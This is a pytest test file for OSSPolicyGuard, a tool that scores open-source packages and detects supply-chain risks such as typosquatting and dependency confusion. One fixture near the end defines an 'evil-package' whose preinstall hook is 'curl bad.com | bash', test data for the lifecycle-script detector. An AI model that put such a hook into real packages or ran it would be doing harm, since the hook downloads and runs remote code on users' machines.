"""Tests for new OSSPolicyGuard modules.

Covers: exceptions, models, identity, reports, typosquatting,
advisory_dedup, policy, kev, dep_confusion, artifact_inventory.
"""
from __future__ import annotations

import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

# Ensure the src layout is importable
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

# ---------------------------------------------------------------------------
# exceptions
# ---------------------------------------------------------------------------

from osspolicyguard.exceptions import (
    OSSPolicyGuardError,
    InternalError,
    ProviderTimeoutError,
)


class TestExceptions:
    def test_base_user_message(self):
        err = OSSPolicyGuardError("something went wrong")
        assert err.user_message() == "Error: something went wrong"

    def test_provider_timeout_exit_code(self):
        err = ProviderTimeoutError("timed out after 10s")
        # ProviderTimeoutError inherits exit_code=3 from ProviderError
        assert err.exit_code == 3

    def test_internal_error_user_message_contains_tracker_url(self):
        err = InternalError("unexpected None")
        msg = err.user_message()
        assert "Internal error" in msg
        assert "https://github.com/nddmars/OSSPolicyGuard/issues" in msg

    def test_internal_error_exit_code(self):
        assert InternalError.exit_code == 99


# ---------------------------------------------------------------------------
# models
# ---------------------------------------------------------------------------

from osspolicyguard.models import (
    Decision,
    Finding,
    Severity,
    Dimension,
    PackageCoordinates,
    EvaluationResult,
)


class TestModels:
    def test_decision_enum_values(self):
        assert Decision.APPROVED.value == "APPROVED"
        assert Decision.REVIEW.value == "REVIEW"
        assert Decision.PROHIBITED.value == "PROHIBITED"

    def test_finding_to_dict_round_trip(self):
        f = Finding(
            code="OPG-SEC-001",
            title="Test finding",
            severity=Severity.HIGH,
            dimension=Dimension.SECURITY,
            score_effect=-10.0,
            evidence_refs=["CVE-2024-0001"],
            policy_rule="POL-SEC-001",
            remediation="Upgrade immediately.",
            confidence=0.9,
        )
        d = f.to_dict()
        assert d["code"] == "OPG-SEC-001"
        assert d["severity"] == "HIGH"
        assert d["dimension"] == "SECURITY"
        assert d["score_effect"] == -10.0
        assert d["evidence_refs"] == ["CVE-2024-0001"]
        assert d["confidence"] == 0.9

    def test_evaluation_result_to_dict_structure(self):
        pkg = PackageCoordinates(ecosystem="npm", name="lodash", version="4.17.21")
        result = EvaluationResult(
            package=pkg,
            decision=Decision.APPROVED,
            score=85.0,
            dimensions={"security": 90.0, "maintenance": 80.0},
        )
        d = result.to_dict()
        assert d["schema_version"] == "1.0"
        assert d["decision"] == "APPROVED"
        assert d["score"] == 85.0
        assert d["package"]["name"] == "lodash"
        assert d["package"]["ecosystem"] == "npm"
        assert d["package"]["version"] == "4.17.21"
        assert d["dimensions"]["security"] == 90.0
        assert isinstance(d["findings"], list)
        assert isinstance(d["evidence"], list)


# ---------------------------------------------------------------------------
# identity
# ---------------------------------------------------------------------------

from osspolicyguard.identity import normalize_package_name, ecosystem_to_purl_type, build_purl


class TestIdentity:
    def test_normalize_npm_scoped_package(self):
        # scoped npm: bare name is the last segment, lowercased
        assert normalize_package_name("@babel/core", "npm") == "core"

    def test_normalize_npm_unscoped(self):
        assert normalize_package_name("Lodash", "npm") == "lodash"

    def test_normalize_pypi_pep503(self):
        # PEP 503: collapse runs of [-_.] to "-", lowercase
        assert normalize_package_name("Pillow", "pypi") == "pillow"
        assert normalize_package_name("my_package", "pypi") == "my-package"
        assert normalize_package_name("My.Package", "pypi") == "my-package"

    def test_ecosystem_to_purl_type_npm(self):
        assert ecosystem_to_purl_type("npm") == "npm"
        assert ecosystem_to_purl_type("javascript") == "npm"

    def test_ecosystem_to_purl_type_pypi(self):
        assert ecosystem_to_purl_type("pypi") == "pypi"
        assert ecosystem_to_purl_type("python") == "pypi"

    def test_build_purl_npm_scoped(self):
        purl = build_purl("@babel/core", "npm", version="7.0.0")
        canonical = purl.to_canonical()
        assert canonical.startswith("pkg:npm/")
        assert "babel" in canonical
        assert "core" in canonical
        assert "7.0.0" in canonical

    def test_build_purl_pypi(self):
        purl = build_purl("Requests", "pypi", version="2.31.0")
        canonical = purl.to_canonical()
        assert canonical.startswith("pkg:pypi/")
        assert "requests" in canonical
        assert "2.31.0" in canonical


# ---------------------------------------------------------------------------
# reports
# ---------------------------------------------------------------------------

from osspolicyguard.reports import build_findings, to_sarif, to_markdown_pr


class TestReports:
    def _minimal_result(self, **overrides):
        base = {
            "schema_version": "1.0",
            "tool_version": "0.1.0",
            "generated_at": "2026-08-01T00:00:00+00:00",
            "policy": {"name": "default", "version": "0.1.0"},
            "package": {"name": "express", "ecosystem": "npm", "version": "4.18.0"},
            "decision": "APPROVED",
            "score": 85.0,
            "dimensions": {
                "security": 88.0,
                "maintenance": 79.0,
                "community": 91.0,
                "supply_chain_risk": 76.0,
            },
            "findings": [],
            "evidence": [],
            "warnings": [],
            "malicious_package_detected": False,
            "enforcement": "default",
        }
        base.update(overrides)
        return base

    def test_build_findings_malicious_returns_opg_mal_001(self):
        evaluation = {
            "scores": {},
            "osv_data": {"is_malicious": True, "malicious_ids": ["MAL-2024-0001"]},
            "cve_data": {},
        }
        findings = build_findings(evaluation)
        codes = [f["code"] for f in findings]
        assert "OPG-MAL-001" in codes
        mal = next(f for f in findings if f["code"] == "OPG-MAL-001")
        assert mal["severity"] == "CRITICAL"
        assert "MAL-2024-0001" in mal["evidence_refs"]

    def test_to_sarif_valid_structure(self):
        result = self._minimal_result()
        sarif = to_sarif(result)
        assert sarif["version"] == "2.1.0"
        assert "$schema" in sarif
        assert len(sarif["runs"]) == 1
        run = sarif["runs"][0]
        assert "tool" in run
        assert run["tool"]["driver"]["name"] == "OSSPolicyGuard"
        assert isinstance(run["results"], list)

    def test_to_markdown_pr_contains_shield_emoji(self):
        result = self._minimal_result()
        md = to_markdown_pr(result)
        assert isinstance(md, str)
        # The header uses the shield emoji U+1F6E1
        assert "\U0001f6e1" in md or "🛡" in md


# ---------------------------------------------------------------------------
# typosquatting
# ---------------------------------------------------------------------------

from osspolicyguard.typosquatting import detect_typosquatting, is_suspicious


class TestTyposquatting:
    def test_detect_typosquatting_reqests_finds_requests(self):
        results = detect_typosquatting("reqests", "pypi")
        similar_to_names = [r["similar_to"] for r in results]
        assert "requests" in similar_to_names

    def test_is_suspicious_lodahs_npm(self):
        # "lodahs" is within edit distance 2 of "lodash"
        assert is_suspicious("lodahs", "npm") is True

    def test_exact_popular_package_is_not_suspicious(self):
        # "lodash" itself should not be flagged
        assert is_suspicious("lodash", "npm") is False

    def test_unknown_ecosystem_returns_empty(self):
        assert detect_typosquatting("reqests", "nuget") == []


# ---------------------------------------------------------------------------
# advisory_dedup
# ---------------------------------------------------------------------------

from osspolicyguard.advisory_dedup import deduplicate_advisories


class TestAdvisoryDedup:
    def test_deduplicate_advisories_merges_shared_cve_alias(self):
        raw = [
            {
                "id": "GHSA-aaaa-bbbb-cccc",
                "aliases": ["CVE-2024-12345"],
                "severity": "HIGH",
                "cvss_score": 7.5,
                "affected_versions": ["1.0.0"],
                "fixed_versions": ["1.0.1"],
                "references": ["https://example.com/advisory"],
                "source": "osv",
                "modified": "2024-01-01",
            },
            {
                "id": "CVE-2024-12345",
                "aliases": [],
                "severity": "MEDIUM",
                "cvss_score": 6.0,
                "affected_versions": ["1.0.0", "0.9.0"],
                "fixed_versions": ["1.0.1"],
                "references": [],
                "source": "nvd",
                "modified": "2024-01-02",
            },
        ]
        result = deduplicate_advisories(raw)
        # Both advisories share CVE-2024-12345 so they merge into one
        assert len(result) == 1
        merged = result[0]
        # Canonical ID should be the CVE (priority over GHSA)
        assert merged.canonical_id == "CVE-2024-12345"
        # Aliases should include the GHSA
        assert "GHSA-aaaa-bbbb-cccc" in merged.aliases
        # Severity should be the higher one (HIGH > MEDIUM)
        assert merged.severity == "HIGH"
        # CVSS score should be the maximum
        assert merged.cvss_score == 7.5
        # Sources from both advisories
        assert "osv" in merged.sources
        assert "nvd" in merged.sources

    def test_deduplicate_advisories_no_overlap_stays_separate(self):
        raw = [
            {
                "id": "CVE-2024-00001",
                "aliases": [],
                "severity": "LOW",
                "cvss_score": None,
                "affected_versions": [],
                "fixed_versions": [],
                "references": [],
                "source": "nvd",
                "modified": None,
            },
            {
                "id": "CVE-2024-00002",
                "aliases": [],
                "severity": "HIGH",
                "cvss_score": 8.0,
                "affected_versions": [],
                "fixed_versions": [],
                "references": [],
                "source": "nvd",
                "modified": None,
            },
        ]
        result = deduplicate_advisories(raw)
        assert len(result) == 2


# ---------------------------------------------------------------------------
# policy
# ---------------------------------------------------------------------------

from osspolicyguard.policy import DEFAULT_POLICY, PolicyBundle


class TestPolicy:
    def test_default_policy_digest_is_16_char_hex(self):
        digest = DEFAULT_POLICY.digest
        assert isinstance(digest, str)
        assert len(digest) == 16
        # Must be a valid hex string
        int(digest, 16)

    def test_default_policy_round_trip(self):
        d = DEFAULT_POLICY.to_dict()
        restored = PolicyBundle.from_dict(d)
        # Digest must match after round-trip
        assert restored.digest == DEFAULT_POLICY.digest
        assert restored.name == DEFAULT_POLICY.name
        assert restored.version == DEFAULT_POLICY.version
        assert len(restored.rules) == len(DEFAULT_POLICY.rules)

    def test_policy_from_dict_to_dict_idempotent(self):
        d1 = DEFAULT_POLICY.to_dict()
        d2 = PolicyBundle.from_dict(d1).to_dict()
        assert d1 == d2


# ---------------------------------------------------------------------------
# kev
# ---------------------------------------------------------------------------

from osspolicyguard.kev import KevProvider


class TestKev:
    def _make_provider_with_catalog(self) -> KevProvider:
        """Return a KevProvider whose catalog is pre-loaded from a mock."""
        provider = KevProvider()
        provider._catalog = {
            "CVE-2021-44228": {
                "cveID": "CVE-2021-44228",
                "vendorProject": "Apache",
                "product": "Log4j",
                "vulnerabilityName": "Log4Shell",
                "dateAdded": "2021-12-10",
                "shortDescription": "Remote code execution",
                "requiredAction": "Apply updates",
                "dueDate": "2021-12-24",
                "notes": "",
                "knownRansomwareCampaignUse": "Known",
            }
        }
        import time
        provider._loaded_at = time.time()
        return provider

    def test_correlate_cves_known_cve(self):
        provider = self._make_provider_with_catalog()
        results = provider.correlate_cves(["CVE-2021-44228", "CVE-2099-99999"])
        assert len(results) == 2

        log4shell = next(r for r in results if r["cve_id"] == "CVE-2021-44228")
        assert log4shell["in_kev"] is True
        assert log4shell["due_date"] == "2021-12-24"
        assert log4shell["ransomware"] is True
        assert log4shell["date_added"] == "2021-12-10"

        unknown = next(r for r in results if r["cve_id"] == "CVE-2099-99999")
        assert unknown["in_kev"] is False
        assert unknown["due_date"] is None

    def test_correlate_cves_returns_correct_structure(self):
        provider = self._make_provider_with_catalog()
        results = provider.correlate_cves(["CVE-2021-44228"])
        assert isinstance(results, list)
        assert len(results) == 1
        entry = results[0]
        for key in ("cve_id", "in_kev", "due_date", "ransomware", "date_added"):
            assert key in entry, f"Missing key: {key}"


# ---------------------------------------------------------------------------
# dep_confusion
# ---------------------------------------------------------------------------

from osspolicyguard.dep_confusion import detect_dependency_confusion


class TestDepConfusion:
    def test_internal_scoped_package_suspicious(self):
        result = detect_dependency_confusion("@internal/mylib")
        assert result["suspicious"] is True
        assert result["package_name"] == "@internal/mylib"

    def test_public_package_not_suspicious(self):
        result = detect_dependency_confusion("lodash")
        assert result["suspicious"] is False

    def test_internal_prefix_suspicious(self):
        result = detect_dependency_confusion("internal-utils")
        assert result["suspicious"] is True

    def test_known_internal_packages_set(self):
        result = detect_dependency_confusion(
            "acme-auth",
            known_internal_packages={"acme-auth", "acme-core"},
        )
        assert result["suspicious"] is True
        assert result["confidence"] == 0.95


# ---------------------------------------------------------------------------
# artifact_inventory
# ---------------------------------------------------------------------------

from osspolicyguard.artifact_inventory import inventory_npm_package


class TestArtifactInventory:
    def test_lifecycle_scripts_detected_from_package_json(self):
        pkg_json = {
            "name": "evil-package",
            "version": "1.0.0",
            "scripts": {
                "preinstall": "curl bad.com | bash",
                "test": "jest",
            },
        }
        inv = inventory_npm_package(package_json=pkg_json)
        assert len(inv.lifecycle_scripts) > 0
        names = [s["name"] for s in inv.lifecycle_scripts]
        assert "preinstall" in names
        # "test" is not a lifecycle hook, should not appear
        assert "test" not in names

    def test_non_lifecycle_scripts_not_captured(self):
        pkg_json = {
            "scripts": {
                "build": "tsc",
                "start": "node index.js",
            }
        }
        inv = inventory_npm_package(package_json=pkg_json)
        assert inv.lifecycle_scripts == []

    def test_no_archive_empty_inventory(self):
        inv = inventory_npm_package()
        assert inv.lifecycle_scripts == []
        assert inv.native_binaries == []
        assert inv.file_count == 0
